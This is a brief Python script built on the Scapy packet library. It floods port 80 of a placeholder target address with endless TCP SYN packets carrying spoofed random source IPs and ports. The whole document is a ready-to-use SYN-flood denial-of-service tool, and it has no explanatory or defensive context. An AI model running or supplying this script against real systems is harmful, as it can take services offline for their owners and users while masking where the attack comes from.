from scapy.all import *


src_ip = RandIP("10.0.0.0/8")
src_port = RandShort()
dst_ip = "A.B.C.D"
dst_port = 80
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=src_port, dport=dst_port, flags="S")
data = Raw("\x58"*64)
send(ip / tcp / data, loop=1)
